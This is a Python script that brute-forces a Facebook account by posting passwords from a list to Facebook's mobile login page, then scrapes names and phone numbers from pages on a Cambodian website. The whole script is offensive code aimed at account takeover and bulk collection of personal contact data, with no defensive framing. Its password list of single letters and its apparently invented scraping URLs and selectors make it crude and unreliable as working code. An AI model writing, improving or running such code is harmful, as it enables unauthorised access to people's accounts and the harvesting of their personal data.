import requests
import re
from bs4 import BeautifulSoup

def brute_force_facebook(user_id, password_list):
    for password in password_list:
        try:
            response = requests.post('https://m.facebook.com/login.php', data={
                'email': user_id,
                'pass': password
            })
            if 'Log Out' in response.text:
                print(f"Password found: {password}")
                return password
        except:
            print("An error occurred during the request.")
    print("Password not found.")
    return None

def find_cambodian_names_and_phone_numbers(names_url, phone_numbers_url):
    names = []
    phone_numbers = []

    # Find names
    try:
        response = requests.get(names_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        name_elements = soup.select('div.name')
        names = [name.text.strip() for name in name_elements]
    except:
        print("An error occurred while fetching names.")

    # Find phone numbers
    try:
        response = requests.get(phone_numbers_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        phone_number_elements = soup.select('div.phone')
        phone_numbers = [phone.text.strip() for phone in phone_number_elements]
    except:
        print("An error occurred while fetching phone numbers.")

    return names, phone_numbers

# Main program
user_id = input("Enter your Facebook user ID: ")
password_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

# Brute-force password
password = brute_force_facebook(user_id, password_list)

if password:
    print(f"Password found: {password}")
else:
    print("Password not found.")

# Find Cambodian names and phone numbers
names_url = 'https://www.cambodia.com/cambodian-names-alphabetically'
phone_numbers_url = 'https://www.cambodia.com/cambodian-phone-numbers-alphabetically'
cambodian_names, cambodian_phone_numbers = find_cambodian_names_and_phone_numbers(names_url, phone_numbers_url)

print("Cambodian Names:")
for name in cambodian_names:
    print(name)

print("\nCambodian Phone Numbers:")
for phone_number in cambodian_phone_numbers:
    print(phone_number)
